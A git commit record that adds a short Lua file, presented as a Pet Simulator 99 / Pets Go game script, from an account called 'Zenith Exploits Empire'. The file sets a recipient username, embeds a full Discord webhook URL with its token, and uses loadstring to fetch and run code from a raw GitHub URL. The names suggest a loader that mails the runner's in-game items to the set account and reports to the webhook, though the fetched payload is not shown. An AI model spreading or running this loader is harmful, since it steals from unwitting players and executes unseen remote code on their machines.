6b60dfdc75ed0982d5dbad4e75b6d792cff3662d
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-21 23:56:43 +0200

    Added petsgo script: Pet sim 99 mmmail box.txt

---
+++ pets go/Pet sim 99 mmmail box.txt.lua
@@ -0,0 +1,5 @@
+Username = "Aaron47093"
+Username2 = "Aaron47093"
+Webhook = "https://discord.com/api/webhooks/1360686344288079932/F1TjJKYP7YOb_Ke5Wc3QZrZSFv36vnphJpZNDEoJxrAXi_-yLgEIKNCUJsXubvh3gcOh"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20pets%20go"))()
